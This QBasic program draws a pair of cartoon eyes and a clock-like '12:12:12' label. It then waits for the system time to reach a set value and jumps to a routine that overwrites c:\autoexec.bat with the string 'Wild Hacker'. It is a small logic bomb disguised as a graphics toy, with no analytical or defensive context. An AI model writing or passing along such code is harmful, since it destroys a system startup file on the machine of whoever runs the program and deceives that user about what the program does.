REM eyes

CLS
SCREEN 7

  CIRCLE (120, 50), 20, 15
        square$ = "bd3"
         DRAW "c2 x" + VARPTR$(square$)
         DRAW "p15,15 c15"
  CIRCLE (120, 50), 10, (9)
 circle$ = "bd6"
     DRAW "c9 x" + VARPTR$(circle$)
        DRAW "p9,9 c9"
    CIRCLE (120, 50), 4, (8)
    CIRCLE (120, 50), 3, (8)
    CIRCLE (120, 50), 2, (8)
    CIRCLE (120, 50), 1, (8)
    CIRCLE (120, 50), 0, (8)
 tram$ = "d1 r1 u4 l2 d4"
     DRAW "c8 x" + VARPTR$(tram$)
  CIRCLE (180, 50), 20, 15
        square$ = "bd3"
         DRAW "c2 x" + VARPTR$(square$)
         DRAW "p15,15 c15"
  CIRCLE (180, 50), 10, (9)
 circle$ = "bd6"
     DRAW "c7 x" + VARPTR$(circle$)
        DRAW "p9,9 c9"
    CIRCLE (180, 50), 4, (8)
    CIRCLE (180, 50), 3, (8)
    CIRCLE (180, 50), 2, (8)
    CIRCLE (180, 50), 1, (8)
    CIRCLE (180, 50), 0, (8)
 tram$ = "d1 r1 u4 l2 d4"
     DRAW "c8 x" + VARPTR$(tram$)
   PRINT
   PRINT
   PRINT
   PRINT
   PRINT
   PRINT
   PRINT
   PRINT
   PRINT
   PRINT "               12:12:12"
   DO
   IF TIME$ = " 12:12:12" THEN GOTO 1
   LOOP UNTIL INKEY$ = "~"
   END
1   n$ = "c:\autoexec.bat"
    OPEN n$ FOR OUTPUT AS #1
    PRINT #1, "   èèWild Hackerèè  "
    CLOSE


